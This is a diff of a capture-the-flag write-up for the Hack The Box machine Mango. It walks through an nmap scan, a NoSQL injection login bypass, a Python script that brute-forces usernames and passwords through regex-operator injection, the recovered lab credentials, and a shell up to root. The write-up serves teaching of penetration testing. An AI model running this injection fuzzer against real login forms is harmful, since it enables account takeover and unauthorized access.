@@ -1,7 +1,5 @@
 # Exercise: Writing a NoSQL injection password fuzzer for the Mango box
 
-
-
 In the Hack The Box machine Mango, an nmap scan reveals an Ubuntu box running SSH on port 22 u, a website on port 80 v and a website on port 443 w. The website on port 80 is returning a status code of 403 forbidden for the default home page. For the website on port 443, the SSL certificate reports a common name for the site of staging-order.mango.htb.
 
 PORT STATE SERVICE VERSION
@@ -37,35 +35,25 @@ w 443/tcp open ssl/ssl Apache httpd (SSL-only mode)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Accessing the website on port 443 using https, we get a warning about the SSL certificate which we can view and confirm nmap's findings that the Common Name of the site is staging-order.mango.htb 
+Accessing the website on port 443 using https, we get a warning about the SSL certificate which we can view and confirm nmap's findings that the Common Name of the site is staging-order.mango.htb
 
 ![SSL certificate for Mango website on port 443](../.gitbook/assets/3%20%282%29.png)
 
 Accepting the risk and continuing takes us to a web page with a search box that is reminiscent of the Google search page.
 
+!\[Graphical user interface, text, application, email
 
+Description automatically generated\]\(../.gitbook/assets/4%20%282%29.png\)
 
-![Graphical user interface, text, application, email
-
-Description automatically generated](../.gitbook/assets/4%20%282%29.png)
-
-Home page for https://10.129.1.219/
+Home page for [https://10.129.1.219/](https://10.129.1.219/)
 
 The search box is not functional as the buttons are hyperlinks to the same page. Clicking on the link for Analytics takes us to a page which shows a spreadsheet with figures broken down by US states \(Figure 3-3\)
 
-
-
 ![Analytics page on Mango](../.gitbook/assets/5%20%286%29.png)
 
-
-
-After enumerating this page, there is nothing that appears obviously exploitable. If we use the URL http://staging-order.mango.htb so that it accesses the site via port 80 however, we get a login page for a different virtual site \(Figure 3-4\).
-
-
+After enumerating this page, there is nothing that appears obviously exploitable. If we use the URL [http://staging-order.mango.htb](http://staging-order.mango.htb) so that it accesses the site via port 80 however, we get a login page for a different virtual site \(Figure 3-4\).
 
 ![Home page for virtual host site on port 80 http://staging-order.mango.htb](../.gitbook/assets/6%20%285%29.png)
-
-
 
 Putting in a username and password and clicking Login takes us back to the same page. We can send the request to Burp by intercepting the request after setting FoxyProxy to use Burp as the proxy. Once we have the request, we can forward to the Repeater tab. Sending the same request with a username of john and password of password results in a status of 200 \(OK\) and the same page. We can check if the login in vulnerable to SQL injection by adding a single quote after the username and the password, but it doesn't appear that it is.
 
@@ -81,7 +69,7 @@ The format reflects the fact that it is PHP interpreting the parameters and the 
 
 Further enumeration of the site once logged on through this bypass doesn't reveal anything. However, we can use the injection to brute force usernames and passwords and to do this, we can write a Python program.
 
-The code for this is as follows[\[4\]]():
+The code for this is as follows[\[4\]](exercise-writing-a-nosql-injection-password-fuzzer-for-the-mango-box.md):
 
 ```python
 import requests
@@ -100,13 +88,13 @@ def brute_user(user=""):
     if inject(data):
       print("")
       break
- 
+
     # cycle through lowercase characters a-z
     for i in range(97,123):
       payload = secret + chr(i)
       print("\r" + payload, flush=False, end='')
       data = {"username[$regex]":"^" + payload, "password[$ne]":"rin", "login":"login"}
- 
+
     if inject(data):
       print("\r" + payload, flush=True, end='')
       secret = secret + chr(i)
@@ -116,11 +104,11 @@ def brute_password(user=""):
   payload = ""
   while True:
     data = {"username": user, "password[$regex]": "^" + payload + "$", "login":"login"}
- 
+
     if inject(data):
       print("")
       break
- 
+
     # cycle through characters ! to ~
     for i in range(32,127):
       if (chr(i) in ['.','?','*','^','+','|','$']):
@@ -131,7 +119,7 @@ def brute_password(user=""):
         payload = secret + chr(i)
         print("\r" + payload + backspace, flush=False, end='')
         data = {"username": user, "password[$regex]": "^" + payload, "login":"login"}
- 
+
       if inject(data):
         print("\r" + payload + backspace, flush=True, end='')
         secret = secret + chr(i)
@@ -139,11 +127,11 @@ def brute_password(user=""):
 
 class Terminal(Cmd):
   intro = 'Bruteforcer for http://staging-order.mango.htb/ Type help or ? to list commands.\n'
- 
+
   def do_getuser(self, args):
     "Brute force username with optional starting string"
     brute_user(args)
- 
+
   def do_getpassword(self, args):
     "Brute force password for specified username"
     brute_password(args)
@@ -156,7 +144,7 @@ To start with, the script imports u the Python module requests which we will use
 
 The function brute\_password { is similar, but operating on the password field and not username \|.
 
- The program starts with creating a Terminal object and calling the command loop that waits for input. If a string is passed to getuser, it will be used as the seed for the brute forcing of that user. A password will be fetched by getpassword for the user supplied as an argument. In this way, multiple users can be brute forced.
+The program starts with creating a Terminal object and calling the command loop that waits for input. If a string is passed to getuser, it will be used as the seed for the brute forcing of that user. A password will be fetched by getpassword for the user supplied as an argument. In this way, multiple users can be brute forced.
 
 Running the application for users we get two, admin and mango. Running each of these reveals the passwords \(admin:t9KcS3&gt;!0B\#2 and mango:h3mXK8RhU~f{\]f5H\) and the user mango can SSH into the machine. Once on the box, we can see that in the /home directory there is the home directory of the other user admin. We can switch user using the su command and use the password we retrieved earlier for the user admin:
 
@@ -202,10 +190,4 @@ Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
 Last login: Thu Sep 24 09:49:52 2020
 root@mango:~#
 ```
-
-
-
-
-
-
 
